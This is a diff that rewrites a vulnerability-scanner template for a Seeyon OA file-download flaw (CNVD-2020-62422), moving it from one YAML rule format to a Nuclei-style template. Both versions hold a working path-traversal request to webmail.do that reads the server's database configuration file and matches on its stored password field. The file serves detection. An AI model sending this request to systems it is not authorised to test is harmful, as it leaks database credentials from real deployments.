@@ -1,20 +1,37 @@
 id: CNVD-2020-62422
 
 info:
-  name: 致远oa系统存在任意文件读取漏洞
-  author: Aquilao(https://github.com/Aquilao)
+  name: Seeyon - Local File Inclusion
+  author: pikpikcu
   severity: medium
-  description: |
-    致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息
-    app="致远互联-OA"
+  description: Seeyon is vulnerable to local file inclusion.
   reference:
-    - https://www.CNVD.org.cn/flaw/show/CNVD-2020-62422
-    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422.html
+    - https://blog.csdn.net/m0_46257936/article/details/113150699
+  tags: lfi,cnvd,cnvd2020,seeyon
+  metadata:
+    max-request: 1
 
-rules:
-    r0:
-        request:
-            method: GET
-            path: /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
-        expression: response.status == 200 && response.content_type.icontains("application/x-msdownload") && response.body.bcontains(b"ctpDataSource.password")
-expression: r0()
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "ctpDataSource.password"
+        condition: and
+
+# Enhanced by mp on 2022/07/22
